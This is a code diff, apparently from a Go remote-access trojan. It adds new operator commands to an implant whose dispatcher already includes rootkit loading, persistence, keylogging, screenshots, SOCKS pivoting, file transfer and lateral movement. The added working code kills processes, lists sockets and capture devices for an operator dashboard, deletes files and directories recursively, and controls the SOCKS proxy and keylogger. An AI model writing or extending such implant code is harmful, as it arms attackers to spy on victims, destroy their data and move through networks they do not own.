@@ -8,6 +8,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 )
 
@@ -35,12 +36,22 @@ func execute(c Cmd) Result {
 		r = Result{OK: true, Out: string(b)}
 	case "ps":
 		r = psList()
+	case "killproc":
+		r = killProcess(atoi(c.Args["pid"], 0))
+	case "netstat":
+		r = netstat()
+	case "devices":
+		r = deviceList()
 
 	// ---------- file transfer ----------
 	case "download":
 		r = download(str(c.Args["path"]))
 	case "upload":
 		r = upload(str(c.Args["path"]), str(c.Args["b64"]))
+	case "rm":
+		r = removePath(str(c.Args["path"]))
+	case "mkdir":
+		r = makeDir(str(c.Args["path"]))
 
 	// ---------- capture ----------
 	case "screenshot":
@@ -76,7 +87,7 @@ func execute(c Cmd) Result {
 
 	// ---------- persistence / evasion ----------
 	case "persist":
-		r = persist()
+		r = persist(str(c.Args["sub"]))
 	case "rootkit":
 		r = loadRootkit(c)
 	case "kill":
@@ -87,8 +98,13 @@ func execute(c Cmd) Result {
 
 	// ---------- pivoting ----------
 	case "socks":
-		startSocks()
-		r = Result{OK: true, Out: "socks agent started"}
+		if str(c.Args["sub"]) == "stop" {
+			r = stopSocks()
+		} else if str(c.Args["sub"]) == "status" {
+			r = socksStatus()
+		} else {
+			r = startSocks()
+		}
 
 	// ---------- keylogging ----------
 	case "keylog":
@@ -99,8 +115,10 @@ func execute(c Cmd) Result {
 			r = keylogDump(str(c.Args["clear"]) == "true")
 		case "stop":
 			r = keylogStop()
+		case "status":
+			r = keylogStatus()
 		default:
-			r = Result{OK: false, Err: "sub must be start|dump|stop"}
+			r = Result{OK: false, Err: "sub must be start|dump|stop|status"}
 		}
 
 	// ---------- recon / lateral movement ----------
@@ -214,6 +232,75 @@ func upload(path, b64 string) Result {
 		return Result{OK: false, Err: err.Error()}
 	}
 	return Result{OK: true, Out: "wrote " + path}
+}
+
+func removePath(path string) Result {
+	if path == "" {
+		return Result{OK: false, Err: "path required"}
+	}
+	info, err := os.Stat(path)
+	if err != nil {
+		return Result{OK: false, Err: err.Error()}
+	}
+	if info.IsDir() {
+		if err := os.RemoveAll(path); err != nil {
+			return Result{OK: false, Err: err.Error()}
+		}
+	} else if err := os.Remove(path); err != nil {
+		return Result{OK: false, Err: err.Error()}
+	}
+	return Result{OK: true, Out: "removed " + path}
+}
+
+func makeDir(path string) Result {
+	if path == "" {
+		return Result{OK: false, Err: "path required"}
+	}
+	if err := os.MkdirAll(path, 0755); err != nil {
+		return Result{OK: false, Err: err.Error()}
+	}
+	return Result{OK: true, Out: "created " + path}
+}
+
+func killProcess(pid int) Result {
+	if pid <= 0 {
+		return Result{OK: false, Err: "pid required"}
+	}
+	var out []byte
+	var err error
+	if runtime.GOOS == "windows" {
+		out, err = newCmd("taskkill", "/PID", strconv.Itoa(pid), "/F").CombinedOutput()
+	} else {
+		out, err = newCmd("kill", "-9", strconv.Itoa(pid)).CombinedOutput()
+	}
+	if err != nil {
+		return Result{OK: false, Out: string(out), Err: err.Error()}
+	}
+	return Result{OK: true, Out: fmt.Sprintf("killed %d", pid)}
+}
+
+// netstat lists the host's own sockets (listening + established).
+func netstat() Result {
+	if runtime.GOOS == "windows" {
+		return runShell("netstat -ano")
+	}
+	if hasCmd("ss") {
+		return runShell("ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null")
+	}
+	return runShell("netstat -tunap 2>/dev/null")
+}
+
+// deviceList exposes capture devices so the dashboard can offer a picker.
+func deviceList() Result {
+	video, audio := listDevices()
+	if video == nil {
+		video = []string{}
+	}
+	if audio == nil {
+		audio = []string{}
+	}
+	b, _ := json.Marshal(map[string][]string{"video": video, "audio": audio})
+	return Result{OK: true, Out: string(b)}
 }
 
 func shellQuote(s string) string {
